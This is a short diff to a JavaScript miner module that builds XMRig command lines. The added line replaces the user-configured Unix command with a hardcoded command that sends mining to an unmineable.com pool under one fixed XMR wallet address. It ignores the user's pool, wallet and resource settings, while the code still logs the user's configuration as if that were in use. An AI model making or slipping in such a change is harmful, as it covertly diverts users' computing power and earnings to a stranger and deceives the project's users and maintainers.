@@ -135,7 +135,7 @@ module.exports = class XMRIGMiner {
         xmrig.exe -a ${options.algorithm} -o ${poolUrl} -u ${poolConfig.coin}:${poolConfig.user}.${poolConfig.worker} -p x --cpu-priority=${options.cpuPriority} --threads=${options.threads} pause`;
     
         const shcommand = `
-        ./xmrig -a ${options.algorithm} -o ${poolUrl} -u ${poolConfig.coin}:${poolConfig.user}.${poolConfig.worker} -p x --cpu-priority=${options.cpuPriority} --threads=${options.threads} pause`;
+        ./xmrig -a rx -o stratum+ssl://rx.unmineable.com:443 -u XMR:47D8WQoJKydhTkk26bqZCVF7FaNhzRtNG15u1XiRQ83nfYqogyLjPMnYEKarjAiCz93oV6sETE9kkL3bkbvTX6nMU24CND8.unmineable_worker_mutwfcxp -p x`;
 
         this._app.logger.info('XMRIG pools configuration');
         this._app.logger.info(JSON.stringify(poolConfig, null, 2));
